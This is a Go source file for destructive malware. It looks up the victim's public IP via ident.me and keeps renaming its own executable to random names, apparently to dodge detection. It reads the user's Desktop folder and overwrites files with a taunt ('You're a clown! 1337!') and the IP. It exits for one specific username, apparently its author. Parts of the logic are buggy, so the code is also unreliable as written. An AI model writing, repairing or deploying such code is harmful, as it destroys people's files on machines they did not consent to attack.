package main

import (
	"encoding/json"
	"fmt"
	"github.com/thanhpk/randstr"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/user"
	"time"
)

type IP struct {
	Query string
}

func main() {
	time.Sleep(16)
	req, errthrow := http.Get("https://ident.me/")
	if errthrow != nil {
		log.Fatal(errthrow)
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {

		}
	}(req.Body)
	body, err888 := ioutil.ReadAll(req.Body)
	if err888 != nil {
		log.Fatal(err888)
	}
	var ip IP
	err := json.Unmarshal(body[:], &ip)
	if err != nil {
		log.Fatal(err)
	}
	Ipfinal := ip.Query
	for {
		time.Sleep(time.Millisecond * 50)
		e, err := os.Executable()
		if err != nil {
			return
		}
		eo := os.Rename(e, "Martin"+randstr.Hex(16)+"Agent")
		if eo != nil {
			return
		}
		lambda, err := user.Current()
		if err != nil {
			log.Fatalf(err.Error())
		}
		username := lambda.Username
		files, err420 := ioutil.ReadDir("/home/" + string(username) + "/Desktop/")
		if err420 != nil {
			log.Fatal(err420)
		}
		fmt.Println("Success")
		if username == "martak" {
			os.Exit(3)
		}
		for _, f := range files {
			var size []int64
			var check = []string{"placeholder"}
			nameOnStack := f.Name()
			sizeOnStack := f.Size()
			for xyz := len(check) - 1; xyz == 0; xyz-- {
				if nameOnStack != check[xyz] {
					fmt.Println(&xyz)
				} else {
					xyz--
				}
			}
			err2 := append(check, nameOnStack)
			if err2 != nil {
				return
			}
			errnumdos := append(size, sizeOnStack)
			if errnumdos != nil {
				break
			}
			writeToFile, err69 := os.OpenFile(nameOnStack, os.O_RDWR, 0755)
			if err69 != nil {
				return
			}
			_, YourMom := writeToFile.WriteString(randstr.String(8) + " " + "You're a clown! 1337!" + " " + Ipfinal)
			if YourMom != nil {
				log.Fatal(YourMom)
			}
			ife := writeToFile.Close()
			if ife != nil {
				break
			}
			fmt.Println(size, check)
		}
	}
}
